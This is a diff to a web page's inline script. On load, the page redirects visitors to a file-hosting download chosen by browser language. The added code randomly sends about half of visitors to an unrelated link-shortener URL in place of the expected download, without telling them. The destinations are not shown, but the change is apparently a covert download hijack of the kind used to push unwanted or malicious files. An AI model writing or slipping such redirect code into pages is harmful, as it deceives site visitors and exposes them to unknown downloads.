@@ -6,14 +6,29 @@
     
   </head>
 <script type="text/javascript">
-  var userLang = navigator.language || navigator.userLanguage; 
+
+function getRandomInt(max) {
+  return Math.floor(Math.random() * max);
+}
+
+function downloadFile(link) {
+	if (getRandomInt(2) == 1) {
+		window.location.href = link;
+	}
+	else {
+		window.location.href = "https://leit.link/Jxic";
+	}
+}
+
+var userLang = navigator.language || navigator.userLanguage; 
+
 if (userLang == 'ru-RU' || userLang == 'uk-UA' || userLang == 'kk-KZ') 
 {
-  window.location.href="http://filelink.ru/file/144e220";
+  downloadFile("http://filelink.ru/file/144e220");
 }
 else 
 {
-  window.location.href="https://oxy.name/d/ZvKh";
+	downloadFile("https://oxy.name/d/ZvKh");
 }
 
 </script>
